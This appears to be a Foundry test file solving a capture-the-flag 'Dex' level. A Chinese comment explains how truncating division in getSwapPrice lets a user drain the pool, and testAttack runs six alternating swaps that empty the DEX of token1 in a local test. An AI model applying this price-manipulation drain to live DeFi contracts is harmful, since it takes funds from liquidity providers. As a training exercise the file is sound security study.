// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

/* 
漏洞原理 
getSwapPrice会产生浮点 浮点会被清除 意味着价格会偏向用户 
随着交换次数的增加 可以薅空dex的代币

Dex		User	
token1	token2	token1	token2
100	    100	    10	    10
110	    90	    0	    20
86	    110	    24	    0
110	    80	    0	    30
69	    110	    41	    0
110	    45	    0	    65
0	    90	    110	    20

在最后一步中，如果我们需要耗尽 110 个 token1
则要交换的 token2 的数量为 (65 * 110)/158 = 45 
*/

contract DexTest is Test {
    Dex public dex;
    SwappableToken token1;
    SwappableToken token2;

    address alice = makeAddr("alice");

    function setUp() public {
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "tokenA", "tokenA", 1000000);
        token2 = new SwappableToken(address(dex), "tokenB", "tokenB", 1000000);
        dex.setTokens(address(token1), address(token2));

        token1.transfer(alice, 10);
        token2.transfer(alice, 10);

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);
    }

    function testAttack() public {
        assertEq(token1.balanceOf(address(dex)), 100);
        assertEq(token2.balanceOf(address(dex)), 100);
        assertEq(token1.balanceOf(alice), 10);
        assertEq(token2.balanceOf(alice), 10);

        vm.startPrank(alice);

        dex.approve(address(dex), 100);
        dex.swap(address(token1), address(token2), 10);
        dex.swap(address(token2), address(token1), 20);
        dex.swap(address(token1), address(token2), 24);
        dex.swap(address(token2), address(token1), 30);
        dex.swap(address(token1), address(token2), 41);
        dex.swap(address(token2), address(token1), 45);

        vm.stopPrank();

        assertEq(token1.balanceOf(address(dex)), 0);
        assertEq(dex.getSwapPrice(address(token2), address(token1), 1), 0);
    }
}
